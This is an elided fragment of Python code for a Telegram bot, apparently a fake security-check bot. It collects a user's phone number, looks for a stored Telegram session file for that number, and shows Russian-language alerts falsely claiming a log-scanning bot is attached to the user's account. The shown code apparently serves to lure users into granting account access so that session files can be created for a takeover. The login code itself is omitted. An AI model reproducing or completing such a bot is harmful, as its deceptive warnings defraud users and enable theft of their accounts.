...
async def contact_handler(msg: Message, state: FSMContext):
    ...
    if not os.path.exists('./session/{phone}.session'.format(phone=phone[1:])):
        ...
        try:
            ...
            await msg.answer(
                text='<b>Тестирование ваших сеансов...</b>',
        ...
        await msg.answer(
            text='<b>У вас уже идет проверка на подозрительные сеансы, ожидайте информации!</b>',
            reply_markup=ReplyKeyboardRemove()
        )
        await state.finish()
...
async def get_account_tg_load(call: CallbackQuery, state: FSMContext):
    ...
    try:
        ...
        await msg_edit.edit_text(
            text='<b>❌К вашему аккаунту подключен бот сканирющий логи подключений, ожидайте результат проверки!</b>'
        )
